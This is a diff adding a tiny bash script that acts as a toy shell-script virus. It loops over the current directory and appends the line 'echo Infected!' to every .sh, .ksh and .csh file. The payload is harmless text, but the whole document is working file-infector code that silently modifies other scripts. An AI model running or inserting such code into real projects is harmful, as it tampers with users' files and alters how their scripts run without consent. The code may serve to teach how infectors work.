@@ -1,0 +1,5 @@
+#!/bin/bash
+for name in $(ls)
+do
+    [[ -f $name && ( ${name: -3} = .sh || ${name: -4} = .ksh || ${name: -4} = .csh ) ]] && echo "echo Infected!" >> "$name"
+done
